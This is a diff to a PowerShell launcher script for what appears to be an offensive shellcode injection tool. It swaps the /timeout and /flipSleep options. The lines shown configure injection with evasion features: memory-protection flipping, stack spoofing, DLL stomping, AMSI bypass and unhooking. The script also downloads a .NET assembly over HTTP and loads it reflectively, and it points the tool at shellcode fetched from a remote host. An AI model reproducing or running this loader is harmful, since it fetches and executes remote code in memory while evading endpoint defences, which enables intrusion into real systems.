@@ -39,10 +39,10 @@ $F = "Passw0rd!"
 # [/protect] protection value that will be applied to the memory region where the shellcode resides ("RX" / "RWX", used in "currentthread")
 $G = "RX"
 
-# [/timeout] timeout for WaitForSingleObject in milliseconds (0 is serve forever, used in "currentthread")
+# [/flipSleep] timeout for NtDelayExecution (ms) to delay execution with PAGE_NOACCESS on the shellcode memory region before resuming the thread (0 is disable memory protection flip, used in "currentthread" and "remotethreadsuspended")
 $H = 0
 
-# [/flipSleep] time to sleep with PAGE_NOACCESS on shellcode memory region before resuming the thread in milliseconds (0 is disable memory protection flip, used in "currentthread" and "remotethreadsuspended")
+# [/timeout] timeout for NtWaitForSingleObject (ms) to wait before doing extra cleanup (0 is serve forever, used in "currentthread")
 $I = 0
 
 # [/fluctuate] protection value to fluctuate with that will be applied to the memory region where the shellcode resides; this option also activates memory obfuscation ("RW", used in "currentthread")
@@ -109,7 +109,7 @@ if ($methods.Contains($A)) {
     }
 }
 
-$cmd = "${A} /sc:http://${B}:${C}/${E} /p:${F} /protect:${G} /timeout:${H} /flipSleep:${I} /fluctuate:${J} /spoofStack:${K} /image:${L} /pid:${M} /ppid:${N} /dll:${O} /stompDll:${P} /stompExport:${Q} /sleep:${R} /blockDlls:${S} /am51:${T} /remoteAm51:${U} /unhook:${V} /debug:${W}"
+$cmd = "${A} /sc:http://${B}:${C}/${E} /p:${F} /protect:${G} /flipSleep:${H} /timeout:${I} /fluctuate:${J} /spoofStack:${K} /image:${L} /pid:${M} /ppid:${N} /dll:${O} /stompDll:${P} /stompExport:${Q} /sleep:${R} /blockDlls:${S} /am51:${T} /remoteAm51:${U} /unhook:${V} /debug:${W}"
 
 $data = (IWR -UseBasicParsing "http://${B}:${C}/${D}").Content
 $assem = [System.Reflection.Assembly]::Load($data)
